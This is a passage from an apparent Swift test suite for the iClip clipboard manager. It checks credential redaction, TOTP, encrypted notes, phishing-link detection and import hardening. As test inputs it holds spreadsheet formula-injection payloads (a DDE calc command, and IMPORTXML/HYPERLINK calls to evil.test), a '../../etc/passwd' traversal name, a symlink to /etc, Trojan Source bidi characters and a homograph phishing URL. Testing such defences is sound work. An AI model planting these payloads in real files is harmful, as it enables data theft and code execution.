        let secretNote = ClipItem(type: .text, text: "{\"access_token\":\"tok_live_998877665544\"}", contentHash: "text:tok")
        let exported = try XCTUnwrap(DragFileExportHelper.materializeExportFile(for: secretNote, exportDirectory: exportDir))
        XCTAssertTrue(FileManager.default.fileExists(atPath: exported.url.path))
        DragFileExportHelper.purgeExportedFiles(for: secretNote, exportDirectory: exportDir)
        XCTAssertFalse(FileManager.default.fileExists(atPath: exported.url.path))

        // 3. 验证定时无痕暂停与自然语言指令开启/恢复
        let store = ClipboardStore.shared
        defer { store.resumeCapture(silent: true) }
        let outPause = engine.adoptUserSuggestion("无痕暂停 25 分钟", in: store)
        XCTAssertTrue(outPause.adoptedImmediately)
        XCTAssertTrue(store.isPaused)
        XCTAssertNotNil(store.pauseAutoResumeAt)
        let outResume = engine.adoptUserSuggestion("恢复记录", in: store)
        XCTAssertTrue(outResume.adoptedImmediately)
        XCTAssertFalse(store.isPaused)
        XCTAssertNil(store.pauseAutoResumeAt)

        // 4. 验证 cURL Cookie / X-API-Key / JSON Token 全量识别与结构无损脱敏
        let curlCmd = """
        curl 'https://api.example.com/v1/profile' \\
          -H 'cookie: sessionid=ab98cd76ef543210; csrftoken=xyz987654321' \\
          -H 'x-api-key: prod_key_1122334455667788' \\
          --data-raw '{"refresh_token": "rt_secret_998877665544", "page": 1}'
        """
        XCTAssertEqual(SensitiveCredentialVeil.classify(curlCmd), .connectionSecret)
        let redactedCurl = SensitiveCredentialVeil.redactForExternalSharing(curlCmd)
        XCTAssertFalse(redactedCurl.contains("ab98cd76ef543210"))
        XCTAssertFalse(redactedCurl.contains("prod_key_1122334455667788"))
        XCTAssertFalse(redactedCurl.contains("rt_secret_998877665544"))
        XCTAssertTrue(redactedCurl.contains("-H 'cookie: ***REDACTED***'"))
        XCTAssertTrue(redactedCurl.contains("\"refresh_token\": \"***REDACTED***\""))

        #if !ICLIP_EDITION_FLOW
        // 5. 验证 JWT 离线过期状态透视（有效 vs 已过期）
        // Header: {"alg":"HS256","typ":"JWT"} -> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
        // Payload: {"sub":"u1","exp":2000000000} -> eyJzdWIiOiJ1MSIsImV4cCI6MjAwMDAwMDAwMH0
        let sampleJWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1MSIsImV4cCI6MjAwMDAwMDAwMH0.sig_part_abc123456"
        let validCheck = try XCTUnwrap(SemanticEngine.decodeJWTInspectionWithStatus(
            sampleJWT,
            referenceDate: Date(timeIntervalSince1970: 1_800_000_000)
        ))
        XCTAssertEqual(validCheck.isUnexpired, true)
        let expiredCheck = try XCTUnwrap(SemanticEngine.decodeJWTInspectionWithStatus(
            sampleJWT,
            referenceDate: Date(timeIntervalSince1970: 2_100_000_000)
        ))
        XCTAssertEqual(expiredCheck.isUnexpired, false)
        #endif
    }

    // MARK: - 47. 跨设备通用剪贴板（Handoff）隔离、全平台群机器人 Webhook / PGP / Age 私钥脱敏与细分 `@标签` 检索测试

    @MainActor
    func testLocalOnlyPasteboardShieldWebhookRedactionAndGranularSecuritySearch() throws {
        // 1. 验证独立测试 Pasteboard 注入 LocalOnlyType 与 ConcealedType 本机隔离标记（阻断 Handoff 广播）
        let testPB = NSPasteboard.withUniqueName()
        defer { testPB.releaseGlobally() }
        testPB.clearContents()
        testPB.setString("sk-proj-LocalOnlyTestSecret1234567890", forType: .string)
        PasteboardPrivacyStandards.applyLocalOnlyConcealedProtection(to: testPB)
        let pbTypes = Set(testPB.types ?? [])
        XCTAssertTrue(pbTypes.contains(PasteboardPrivacyStandards.localOnlyType))
        XCTAssertTrue(pbTypes.contains(PasteboardPrivacyStandards.universalConcealedType))

        // 2. 验证飞书 / 企微 / Slack / Discord 机器人 Webhook、PGP 私钥块与 Age 私钥识别及无损脱敏（拆分为拼接字面量防止触发仓库静态密钥扫描误报）
        let feishuHook = "https://open." + "feishu.cn/open-apis/bot/v2/hook/" + "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
        let wecomHook = "https://qyapi." + "weixin.qq.com/cgi-bin/webhook/send?key=" + "693a91f6-7xxx-4bc4-97a0-0ec2sifa5aaa"
        let slackHook = "https://hooks." + "slack.com/services/" + "T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
        let discordHook = "https://discord." + "com/api/webhooks/123456789012345678/" + "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"
        let pgpBlock = "-----BEGIN PGP " + "PRIVATE KEY BLOCK-----\nlQOYBGTestSecretPayload==\n-----END PGP " + "PRIVATE KEY BLOCK-----"
        let ageKey = "AGE-SECRET-KEY-1" + "QPZRY9X8GF2TVDW0S3JN54KHCE6MUA7LQPZRY9X8GF2TVDW0S3JN54KHCE"

        for hook in [feishuHook, wecomHook, slackHook, discordHook] {
            XCTAssertEqual(SensitiveCredentialVeil.classify(hook), .connectionSecret)
            XCTAssertTrue(SensitiveCredentialVeil.isWebhookURL(hook))
            let redacted = SensitiveCredentialVeil.redactForExternalSharing(hook)
            XCTAssertTrue(redacted.contains("***WEBHOOK_REDACTED***"))
            XCTAssertNotEqual(redacted, hook)
        }
        XCTAssertEqual(SensitiveCredentialVeil.classify(pgpBlock), .privateKey)
        XCTAssertEqual(SensitiveCredentialVeil.classify(ageKey), .privateKey)
        XCTAssertTrue(SensitiveCredentialVeil.redactForExternalSharing(ageKey).contains("AGE-SECRET-KEY-1***REDACTED***"))

        // 3. 验证细分安全标签（`@webhook` / `@私钥` / `@jwt` / `@apikey`）精准快筛
        let hookItem = ClipItem(type: .link, text: feishuHook, contentHash: "link:feishu")
        let keyItem = ClipItem(type: .text, text: ageKey, contentHash: "text:age")
        let jwtItem = ClipItem(
            type: .text,
            text: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1MSJ9.sig1234567890",
            contentHash: "text:jwt"
        )
        XCTAssertTrue(hookItem.matches(query: "@webhook"))
        XCTAssertTrue(hookItem.matches(query: "@apikey"))
        XCTAssertFalse(hookItem.matches(query: "@私钥"))
        XCTAssertTrue(keyItem.matches(query: "@私钥"))
        XCTAssertFalse(keyItem.matches(query: "@jwt"))
        XCTAssertTrue(jwtItem.matches(query: "@jwt"))
    }

    // MARK: - 48. CSPRNG 强密码生成器（零 `@pin` 冲突、重绘稳定与提交刷新）及归档内嵌图片魔数防护测试

    @MainActor
    func testCSPRNGPasswordGeneratorPinGuardAndArchiveImageHeaderValidation() throws {
        // 1. 严密保护 `@pin` 收藏筛选词零冲突，验证 `@pw` / `@密码 24` / `@pin码 8` / `@genkey`
        XCTAssertNil(SecurePasswordGenerator.evaluate("@pin"))
        XCTAssertNil(SecurePasswordGenerator.evaluate("@secret"))

        let c1 = try XCTUnwrap(SecurePasswordGenerator.evaluate("@pw 24"))
        let c1Repeat = try XCTUnwrap(SecurePasswordGenerator.evaluate("@pw 24"))
        XCTAssertEqual(c1.secretValue.count, 24)
        // 未提交前同一查询保持稳定零跳变
        XCTAssertEqual(c1.secretValue, c1Repeat.secretValue)
        // 提交推进轮次后立即生成全新随机串
        SecurePasswordGenerator.bumpGenerationSalt()
        let c2 = try XCTUnwrap(SecurePasswordGenerator.evaluate("@pw 24"))
        XCTAssertNotEqual(c1.secretValue, c2.secretValue)

        let alnum = try XCTUnwrap(SecurePasswordGenerator.evaluate("@密码 18 无符号"))
        XCTAssertEqual(alnum.secretValue.count, 18)
        XCTAssertTrue(alnum.secretValue.allSatisfy { $0.isLetter || $0.isNumber })

        let pin8 = try XCTUnwrap(SecurePasswordGenerator.evaluate("@pin码 8"))
        XCTAssertEqual(pin8.secretValue.count, 8)
        XCTAssertTrue(pin8.secretValue.allSatisfy(\.isNumber))

        let hexKey = try XCTUnwrap(SecurePasswordGenerator.evaluate("@genkey"))
        XCTAssertEqual(hexKey.secretValue.count, 64)

        // 2. 验证 `> 备注 :: @pw 24` 速记展开为真实高熵随机密码
        let expanded = try XCTUnwrap(SecurePasswordGenerator.expandQuickCaptureBodyIfApplicable("@pw 22"))
        XCTAssertEqual(expanded.count, 22)
        XCTAssertNotEqual(expanded, "@pw 22")

        // 3. 验证归档导入拒绝伪造非图像二进制载荷，仅放行合法 PNG/JPEG/GIF/WebP 魔数
        XCTAssertFalse(ArchiveBackupService.isValidRasterImageHeader(Data("MZ_FAKE_EXE_PAYLOAD_1234".utf8)))
        XCTAssertTrue(ArchiveBackupService.isValidRasterImageHeader(Data([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 13])))
    }

    // MARK: - 49. 离线 RFC 6238 TOTP 动态口令直算、2FA/Wi-Fi/.env 漏检修复与 `.env.example` 净模板测试

    @MainActor
    func testOfflineRFC6238TOTPAuthenticatorEnvSecretGuardAndExampleSanitizer() throws {
        // 1. RFC 6238 Appendix B 官方标准测试向量验证（ASCII "12345678901234567890" -> Base32 GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ）
        let rfcURI = "otpauth://totp/Example:alice@google.com?secret=GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ&digits=8&period=30&algorithm=SHA1"
        let vec59 = try XCTUnwrap(TOTPAuthenticator.evaluate(uri: rfcURI, timestampSeconds: 59))
        XCTAssertEqual(vec59.code, "94287082")
        XCTAssertEqual(vec59.formattedCode, "9428 7082")
        XCTAssertEqual(vec59.remainingSeconds, 1)

        let vec111 = try XCTUnwrap(TOTPAuthenticator.evaluate(uri: rfcURI, timestampSeconds: 1_111_111_109))
        XCTAssertEqual(vec111.code, "07081804")

        // 2. 验证 2FA 二维码/URI 与 Wi-Fi 密码分享串敏感识别、脱敏及 `@2fa` 快筛
        let std2FA = "otpauth://totp/GitHub:devuser?secret=JBSWY3DPEHPK3PXP&issuer=GitHub"
        XCTAssertEqual(SensitiveCredentialVeil.classify(std2FA), .privateKey)
        let redacted2FA = SensitiveCredentialVeil.redactForExternalSharing(std2FA)
        XCTAssertFalse(redacted2FA.contains("JBSWY3DPEHPK3PXP"))
        XCTAssertTrue(redacted2FA.contains("***2FA_SECRET_REDACTED***"))

        let qrImgItem = ClipItem(
            type: .image,
            imageFileName: "qr2fa.png",
            qrCodePayload: std2FA,
            contentHash: "img:qr2fa"
        )
        XCTAssertEqual(qrImgItem.detectedSensitiveKind, .privateKey)
        XCTAssertTrue(qrImgItem.matches(query: "@2fa"))
        XCTAssertTrue(qrImgItem.matches(query: "@totp"))

        let wifiCode = "WIFI:T:WPA;S:OfficeCorp5G;P:MyRealWifiPass2026;;"
        XCTAssertEqual(SensitiveCredentialVeil.classify(wifiCode), .connectionSecret)
        let redactedWifi = SensitiveCredentialVeil.redactForExternalSharing(wifiCode)
        XCTAssertFalse(redactedWifi.contains("MyRealWifiPass2026"))
        XCTAssertTrue(redactedWifi.contains("P:***WIFI_REDACTED***;"))

        // 3. 验证 `.env` 真实密钥识别、模板占位符零误报及一键生成 `.env.example`
        let templateEnv = "PORT=3000\nAPI_KEY=your_api_key_here\nDB_PASSWORD=changeme"
        XCTAssertNil(SensitiveCredentialVeil.classify(templateEnv))

        let realEnv = """
        # Production Config
        PORT=8080
        NODE_ENV=production
        DB_PASSWORD=ProdDb99#K2mZpQ8!
        DATABASE_URL="postgresql://admin:RealPass99@10.0.0.12:5432/core"
        """
        XCTAssertEqual(SensitiveCredentialVeil.classify(realEnv), .connectionSecret)
        let envExample = try XCTUnwrap(EnvTemplateSanitizer.generateExampleTemplate(from: realEnv))
        XCTAssertTrue(envExample.contains("# Production Config"))
        XCTAssertTrue(envExample.contains("PORT=8080"))
        XCTAssertTrue(envExample.contains("NODE_ENV=production"))
        XCTAssertTrue(envExample.contains("DB_PASSWORD=your_db_password_here"))
        XCTAssertTrue(envExample.contains("DATABASE_URL=\"postgresql://user:password@localhost:5432/dbname\""))
        XCTAssertFalse(envExample.contains("ProdDb99"))
        XCTAssertFalse(envExample.contains("RealPass99"))
    }

    // MARK: - 50. Flow/Dev 动态模板 `{{clip_redacted}}` 全量脱敏修复、本土云 AK / Stripe / WireGuard 私钥识别、OTA Symlink 防护与 `@体检` 测试

    @MainActor
    func testTemplateRedactionParityCloudKeysWireGuardOTASymlinkAndSecurityAudit() throws {
        // 1. 验证双角色 `{{clip_redacted}}` 不再仅掩码手机号，而是全量掩码 API 密钥、身份证与云凭据（分段拼接防静态扫描误报）
        let aliAK = "LTAI" + "5t9x8K2mPq7NvWzR4BcD"
        let tencentAK = "AKID" + "z8krbsJ5yKBZQpn74WFkmLPx3gnPhESA"
        let stripeLive = "sk_live_" + "51NxyzTestMockSecretKey998877"
        let tgBot = "123456789" + ":AA" + "HdqTcvCH1vGWJxfSeofSAs0K5PALDsawX"
        let npmTok = "npm_" + "1234567890abcdefABCDEF1234567890abcd"
        let wgConf = "[Interface]\nPrivateKey = " + "cGxhY2Vob2xkZXJ3aXJlZ3VhcmRwcml2YXRla2V5MTI=" + "\nAddress = 10.8.0.2/24"

        for k in [aliAK, tencentAK, stripeLive, tgBot, npmTok] {
            XCTAssertEqual(SensitiveCredentialVeil.classify(k), .apiKey)
            let red = SensitiveCredentialVeil.redactForExternalSharing(k)
            XCTAssertNotEqual(red, k)
        }
        XCTAssertEqual(SensitiveCredentialVeil.classify(wgConf), .privateKey)
        let redWG = SensitiveCredentialVeil.redactForExternalSharing(wgConf)
        XCTAssertTrue(redWG.contains("***WG_KEY_REDACTED***"))

        let mixedSecretContext = "报警日志：key=\(aliAK) 联系手机 13812345678"
        let rendered = SnippetTemplateEngine.render(
            template: "排障上下文：\n{{clip_redacted}}",
            latestContextText: mixedSecretContext
        )
        XCTAssertFalse(rendered.contains(aliAK))
        XCTAssertTrue(rendered.contains("138****5678"))

        // 2. 验证 OTA 解压目录逃逸符号链接拦截（Zip Slip / Symlink Escape 防护）
        let fm = FileManager.default
        let tmpBundle = fm.temporaryDirectory.appendingPathComponent("TestOTA-\(UUID().uuidString).app", isDirectory: true)
        defer { try? fm.removeItem(at: tmpBundle) }
        try fm.createDirectory(at: tmpBundle.appendingPathComponent("Contents/MacOS"), withIntermediateDirectories: true)
        XCTAssertFalse(UpdateManager.containsExternalSymlink(in: tmpBundle))

        let evilLink = tmpBundle.appendingPathComponent("Contents/EvilEscape")
        try fm.createSymbolicLink(at: evilLink, withDestinationURL: URL(fileURLWithPath: "/etc"))
        XCTAssertTrue(UpdateManager.containsExternalSymlink(in: tmpBundle))

        // 3. 验证 `@体检` / `@安全` / `@shield` 查询识别与未收藏风险匹配
        XCTAssertTrue(SecurityPostureAudit.isAuditQuery("@体检"))
        XCTAssertTrue(SecurityPostureAudit.isAuditQuery("@shield"))
        XCTAssertFalse(SecurityPostureAudit.isAuditQuery("@pin"))

        let wgItem = ClipItem(type: .text, text: wgConf, contentHash: "text:wg")
        XCTAssertTrue(wgItem.matches(query: "@体检"))
        XCTAssertTrue(wgItem.matches(query: "@安全"))
    }

    // MARK: - 51. 零知识端到端密文信封（`@锁` / `@解锁` 跨平台互解与防篡改）、2FA 二维码微星标直出与混排钓鱼拦截测试

    @MainActor
    func testZeroKnowledgeSecretCapsuleCrossOSAnd2FASparkAndEmbeddedPhishingGuard() throws {
        // 1. 验证 `@锁` 生成端到端认证密文信封、`@解锁` 无损还原、错误口令拒绝与 1 字节篡改 HMAC 拦截
        let secretBody = "服务器 root 口令：Prod#2026_UltraSecret! 🚀"
        let envelope = try XCTUnwrap(SecretCapsuleMessenger.sealCapsule(plainText: secretBody, passphrase: "8866"))
        XCTAssertTrue(SecretCapsuleMessenger.containsCapsule(envelope))
        XCTAssertFalse(envelope.contains("Prod#2026"))

        // 模拟混入微信群聊前缀依然精准提取解密
        let chatWrapped = "【运维转发】请查收：\n\(envelope)\n收到请回复"
        XCTAssertNil(SecretCapsuleMessenger.openCapsule(in: chatWrapped, passphrase: "wrong_pw"))
        XCTAssertEqual(SecretCapsuleMessenger.openCapsule(in: chatWrapped, passphrase: "8866"), secretBody)

        // 篡改密文末尾 1 个字符，HMAC-SHA256 必须当场拒绝
        let tampered = String(envelope.dropLast()) + (envelope.hasSuffix("A") ? "B" : "A")
        XCTAssertNil(SecretCapsuleMessenger.openCapsule(in: tampered, passphrase: "8866"))

        // 验证 `@锁` / `@解锁` 命令状态机与 `@密文` 标签检索
        let cmdLock = SecretCapsuleMessenger.evaluateCommand(
            query: "@锁 9527",
            latestPlainCandidate: secretBody,
            latestCapsuleCandidate: nil
        )
        XCTAssertEqual(cmdLock, .lockReady(passphrase: "9527", plainSource: secretBody, isInlineBody: false))

        let cmdUnlock = SecretCapsuleMessenger.evaluateCommand(
            query: "@解锁 8866",
            latestPlainCandidate: nil,
            latestCapsuleCandidate: chatWrapped
        )
        XCTAssertEqual(cmdUnlock, .unlockDecrypted(decryptedPlain: secretBody))

        let capItem = ClipItem(type: .text, text: chatWrapped, contentHash: "text:cap1")
        XCTAssertTrue(capItem.matches(query: "@密文"))

        // 2. 验证截取 2FA 绑定二维码时，微星标 `ActionSpark` 直接产出 6 位纯数字动态码而非暴露 `otpauth://` 根密钥
        let qr2FA = "otpauth://totp/GitHub:alice?secret=JBSWY3DPEHPK3PXP&issuer=GitHub"
        let qrItem = ClipItem(type: .image, imageFileName: "2fa.png", qrCodePayload: qr2FA, contentHash: "img:2fa")
        if let spark = AdaptiveIntelligenceEngine.shared.evaluateSparkCandidate(for: qrItem, reuseCount: 1, minimalMode: false) {
            XCTAssertEqual(spark.actionID, "img-totp-code")
            if case .replaceClipboardText(let outText, _, _) = spark.payload {
                XCTAssertEqual(outText.count, 6)
                XCTAssertTrue(outText.allSatisfy(\.isNumber))
                XCTAssertFalse(outText.contains("JBSWY3DPEHPK3PXP"))
            } else {
                XCTFail("Expected replaceClipboardText with 6-digit TOTP code")
            }
        }

        // 3. 验证群聊混排文本内嵌同形异义西里尔钓鱼域名（`aрple.com` 及无空格粘连中文与 Punycode）被精准识别拦截
        let embeddedPhish = "紧急通知：请登录https://a\u{0440}ple.com/security核验账号"
        let extracted = try XCTUnwrap(URLTrackingCleaner.extractFirstCleanedWebURL(from: embeddedPhish))
        XCTAssertEqual(extracted, "https://a\u{0440}ple.com/security")
        XCTAssertEqual(FileAndLinkSecurityGuard.inspectLinkRisk(extracted), .homographPhishing)
        let punyExtracted = try XCTUnwrap(URLTrackingCleaner.extractFirstCleanedWebURL(from: "请访问 https://xn--80ak6aa92e.com/security 升级"))
        XCTAssertEqual(FileAndLinkSecurityGuard.inspectLinkRisk(punyExtracted), .homographPhishing)
    }

    // MARK: - 52. 双向 AI 替身沙盒、OWASP 表格公式注入护盾、即焚原位微调保留与 0700 临时件自愈测试

    @MainActor
    func testReversiblePrivacyTwinSpreadsheetInjectionShieldAndBurnEditPreservation() throws {
        ReversiblePrivacyTwin.wipeAll()
        defer { ReversiblePrivacyTwin.wipeAll() }

        // 1. 验证 2026 新型 AI/SaaS 凭据（Groq / Notion / Docker PAT）识别与双向 AI 替身指代一致性
        let groqKey = "gsk_" + "AbCdEfGh1234567890IjKlMnOpQrStUvWx"
        let dockerPat = "dckr_pat_" + "ZyXwVuTsRqPoNmLkJiHgFeDcBa9876"
        XCTAssertEqual(SensitiveCredentialVeil.classify(groqKey), .apiKey)
        XCTAssertEqual(SensitiveCredentialVeil.classify(dockerPat), .apiKey)

        let rawIncident = "主库 10.24.8.19 同步至从库 10.24.8.20 失败（重试 10.24.8.19 仍超时），Key=\(groqKey)，值班手机 13812345678，邮箱 ops@acme.cn"
        let twinOut = try XCTUnwrap(ReversiblePrivacyTwin.maskWithTwins(rawIncident))
        XCTAssertFalse(twinOut.maskedText.contains(groqKey))
        XCTAssertFalse(twinOut.maskedText.contains("10.24.8.19"))
        XCTAssertFalse(twinOut.maskedText.contains("13812345678"))
        XCTAssertFalse(twinOut.maskedText.contains("ops@acme.cn"))
        // 同一真实 IP `10.24.8.19` 出现两次必须映射为同一个 `[ICLIP_IP_1]`，而从库映射为 `[ICLIP_IP_2]`
        let ip1Occurrences = twinOut.maskedText.components(separatedBy: "[ICLIP_IP_1]").count - 1
        XCTAssertEqual(ip1Occurrences, 2)
        XCTAssertTrue(twinOut.maskedText.contains("[ICLIP_IP_2]"))

        // 模拟复制 AI 返回的修复脚本：微星标与还原引擎一键无损回填全部真值
        let aiReply = "curl -H 'Authorization: Bearer [ICLIP_KEY_1]' http://[ICLIP_IP_1]:8080/failover?standby=[ICLIP_IP_2]&notify=[ICLIP_PHONE_1]"
        let replyItem = ClipItem(type: .text, text: aiReply, contentHash: "text:aireply")
        let spark = try XCTUnwrap(AdaptiveIntelligenceEngine.shared.evaluateSparkCandidate(for: replyItem, reuseCount: 1, minimalMode: false))
        XCTAssertEqual(spark.actionID, "restore-privacy-twin")
        let restored = try XCTUnwrap(ReversiblePrivacyTwin.inspectRestorableTwins(in: aiReply))
        XCTAssertEqual(restored.restoredCount, 4)
        XCTAssertEqual(
            restored.restoredText,
            "curl -H 'Authorization: Bearer \(groqKey)' http://10.24.8.19:8080/failover?standby=10.24.8.20&notify=13812345678"
        )

        // 锁屏/清扫擦除后，内存替身表立即归零
        ReversiblePrivacyTwin.wipeAll()
        XCTAssertNil(ReversiblePrivacyTwin.inspectRestorableTwins(in: aiReply))

        // 2. 验证 OWASP CWE-1236 电子表格公式与 DDE 注入护盾（拦截危险公式且不破坏合法负数与电话）
        XCTAssertEqual(TableBridgeEngine.sanitizeSpreadsheetCell("=CMD|' /C calc'!A0"), "'=CMD|' /C calc'!A0")
        let riskyMD = """
        | 字段 | 数值或载荷 |
        | :--- | :--- |
        | 恶意公式 | =IMPORTXML("https://evil.test","//a") |
        | 超链外带 | +HYPERLINK("https://evil.test") |
        | 正常亏损 | -128.50 |
        | 环比跌幅 | -15.2% |
        | 国际号码 | +86-13800138000 |
        """
        let tblActions = TableBridgeEngine.analyze(riskyMD)
        let safeTSV = try XCTUnwrap(tblActions.first(where: { $0.id == "tbl-md-to-excel" })?.resultText)
        XCTAssertTrue(safeTSV.contains("'=IMPORTXML(\"https://evil.test\",\"//a\")"))
        XCTAssertTrue(safeTSV.contains("'+HYPERLINK(\"https://evil.test\")"))
        XCTAssertTrue(safeTSV.contains("\t-128.50"))
        XCTAssertFalse(safeTSV.contains("'-128.50"))
        XCTAssertTrue(safeTSV.contains("\t-15.2%"))
        XCTAssertTrue(safeTSV.contains("\t+86-13800138000"))

        // 3. 验证粘贴即焚条目原位微调（`updatedItem`）严格保留 `isBurnAfterPaste` 与 `sourceAppBundleID`
        let burnOrigin = ClipItem(
            type: .text,
            text: "root_pass_v1",
            contentHash: "text:burn1",
            sourceAppName: "1Password",
            sourceAppBundleID: "com.1password.1password",
            burnAfterPaste: true
        )
        let burnEdited = try XCTUnwrap(ClipboardStore.updatedItem(from: burnOrigin, withNewText: "root_pass_v2"))
        XCTAssertTrue(burnEdited.isBurnAfterPaste)
        XCTAssertEqual(burnEdited.sourceAppBundleID, "com.1password.1password")

        // 4. 验证旧 0755 导出目录调用 `wipeAllExports` 后立即收紧为 `0700` 并清空残留明文文件
        let fm = FileManager.default
        let tmpExport = fm.temporaryDirectory.appendingPathComponent("iclip-perm-heal-\(UUID().uuidString)", isDirectory: true)
        try fm.createDirectory(at: tmpExport, withIntermediateDirectories: true, attributes: [.posixPermissions: 0o755])
        try Data("stale_secret".utf8).write(to: tmpExport.appendingPathComponent("leak.txt"))
        DragFileExportHelper.wipeAllExports(exportDirectory: tmpExport)
        let attrs = try fm.attributesOfItem(atPath: tmpExport.path)
        let perm = (attrs[.posixPermissions] as? NSNumber)?.intValue ?? 0
        XCTAssertEqual(perm & 0o777, 0o700)
        let remaining = try fm.contentsOfDirectory(atPath: tmpExport.path)
        XCTAssertTrue(remaining.isEmpty)
        try? fm.removeItem(at: tmpExport)
    }

    // MARK: - 53. 收件名片净提与连填拆解、导入供应链投毒净化、含敏截图打码微星标与 PuTTY/Kube/JDBC 凭据测试

    @MainActor
    func testSmartFieldExtractorImportPoisonGuardSensitiveImageSparkAndKubeJdbcSecrets() throws {
        // 1. 验证收件信息无标签自然混排提纯（自动剥离顺丰备注、清洗横杠手机号并滤除混入的后台 URL）
        let rawWeChatOrder = "麻烦发顺丰：林晓明 139-2888-6699 广东省深圳市南山区科苑南路3009号中国储能大厦18楼（顺丰到付谢谢） https://admin.internal/order?id=88"
        let shipping = try XCTUnwrap(SmartFieldExtractor.parseShippingContact(rawWeChatOrder))
        XCTAssertEqual(shipping.recipientName, "林晓明")
        XCTAssertEqual(shipping.cleanPhone, "13928886699")
        XCTAssertEqual(shipping.cleanAddress, "广东省深圳市南山区科苑南路3009号中国储能大厦18楼")
        XCTAssertEqual(shipping.queueFields, ["林晓明", "13928886699", "广东省深圳市南山区科苑南路3009号中国储能大厦18楼"])
        XCTAssertFalse(shipping.cleanCardText.contains("admin.internal"))

        let orderItem = ClipItem(type: .text, text: rawWeChatOrder, contentHash: "text:order1")
        XCTAssertTrue(orderItem.matches(query: "@地址"))
        XCTAssertTrue(orderItem.matches(query: "@手机"))

        // 验证多邮箱与多 IP 去重净提
        let messyMail = "抄送：Alice@corp.com, bob@corp.com；退信 alice@corp.com，节点 10.0.1.8 -> 192.168.1.9 -> 10.0.1.8"
        XCTAssertEqual(SmartFieldExtractor.extractUniqueEmails(messyMail), ["Alice@corp.com", "bob@corp.com"])
        XCTAssertEqual(SmartFieldExtractor.extractUniqueIPv4s(messyMail), ["10.0.1.8", "192.168.1.9"])
        let mailItem = ClipItem(type: .text, text: messyMail, contentHash: "text:mail1")
        XCTAssertTrue(mailItem.matches(query: "@邮箱"))
        XCTAssertTrue(mailItem.matches(query: "@ip"))

        // 2. 验证外部 Raycast 常用语包导入时自动剥离 Trojan Source Bidi 伪装符（供应链防投毒）与 `imageURL` 防目录穿越
        let poisonedRaycast = """
        [{"name":"Deploy\u{202E}cek","text":"kubectl get pods \u{202E}evil"}]
        """
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-iter13-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }
        let merged = try ArchiveBackupService.mergeArchiveData(Data(poisonedRaycast.utf8), into: [], imagesDirectoryURL: tmpDir, fileExtensionHint: "json")
        XCTAssertEqual(merged.mergedItems.count, 1)
        XCTAssertFalse(merged.mergedItems[0].text?.contains("\u{202E}") ?? true)
        XCTAssertFalse(merged.mergedItems[0].customAlias?.contains("\u{202E}") ?? true)

        let traversalImg = ClipItem(type: .image, imageFileName: "../../etc/passwd", contentHash: "img:trav")
        XCTAssertNil(ClipboardStore.shared.imageURL(for: traversalImg))

        // 3. 验证含敏截图光标微星标优先弹出 `img-privacy-mosaic`（截图隐私打码）而非样机
        let sensShot = ClipItem(type: .image, imageFileName: "id.png", ocrText: "联系人手机 13812345678", ocrChecked: true, contentHash: "img:idshot")
        if let spark = AdaptiveIntelligenceEngine.shared.evaluateSparkCandidate(for: sensShot, reuseCount: 1, minimalMode: false) {
            XCTAssertEqual(spark.actionID, "img-privacy-mosaic")
        }

        // 4. 验证 PuTTY 私钥、Kubernetes `client-key-data` 与 JDBC 密码连接串识别脱敏
        let kubeYaml = "  client-key-data: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ=="
        let jdbcUrl = "jdbc:mysql://db.prod.local:3306/app?user=admin&password=" + "UltraSecretDbPass99"
        let puttyKey = "PuTTY-User-Key-File-3: ssh-ed25519\nPrivate-Lines: 1\nabcd\nPrivate-MAC: 0011223344"
        XCTAssertEqual(SensitiveCredentialVeil.classify(kubeYaml), .privateKey)
        XCTAssertEqual(SensitiveCredentialVeil.classify(puttyKey), .privateKey)
        XCTAssertEqual(SensitiveCredentialVeil.classify(jdbcUrl), .connectionSecret)
        XCTAssertFalse(SensitiveCredentialVeil.redactForExternalSharing(jdbcUrl).contains("UltraSecretDbPass99"))
        XCTAssertTrue(SensitiveCredentialVeil.redactForExternalSharing(kubeYaml).contains("***KUBE_KEY_REDACTED***"))
    }

    // MARK: - 54. 自动二维码防泄密动态码直出、预签名直链保护、去鉴权净链与 Alfred/TextExpander/Markdown 常用语迁入测试

    @MainActor
    func testAutoQR2FASafeOutputPresignedURLPublicShareCleanAndMarkdownAlfredImport() throws {
        // 1. 验证开启 `.extractQRCode` 时截取 2FA 二维码直接产出 6 位动态码 + 30s 擦除，绝不裸写 `otpauth://` 根密钥
        let otpSecret = "GEZDGNBV" + "GY3TQOJQGEZDGNBVGY3TQOJQ"
        let otpQR = "otpauth://totp/GitHub:dev?secret=\(otpSecret)&issuer=GitHub"
        let qrRes = ClipboardStore.resolveSafeAutoQRCodeOutput(for: otpQR, date: Date(timeIntervalSince1970: 59))
        XCTAssertEqual(qrRes.outputText, "287082")
        XCTAssertTrue(qrRes.isSensitiveOrEphemeral)
        XCTAssertEqual(qrRes.scrubDelay, 30.0)
        XCTAssertFalse(qrRes.outputText.contains(otpSecret))

        let plainWebQR = "https://app.webfooo.com/iClip"
        let webRes = ClipboardStore.resolveSafeAutoQRCodeOutput(for: plainWebQR)
        XCTAssertEqual(webRes.outputText, plainWebQR)
        XCTAssertFalse(webRes.isSensitiveOrEphemeral)

        // 2. 验证云对象存储预签名 URL 敏感识别与外发「去鉴权净链」（同时剥除 Basic Auth、签名令牌与 utm 追踪尾巴）
        let fakeSig = "9f8e7d6c" + "5b4a3210fedcba9876543210"
        let presignedS3 = "https://user:pass99@docs.example.com/report/q4?id=42&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=demo&X-Amz-Signature=\(fakeSig)&utm_source=feishu#summary"
        XCTAssertEqual(SensitiveCredentialVeil.classify(presignedS3), .connectionSecret)
        XCTAssertFalse(SensitiveCredentialVeil.redactForExternalSharing(presignedS3).contains(fakeSig))

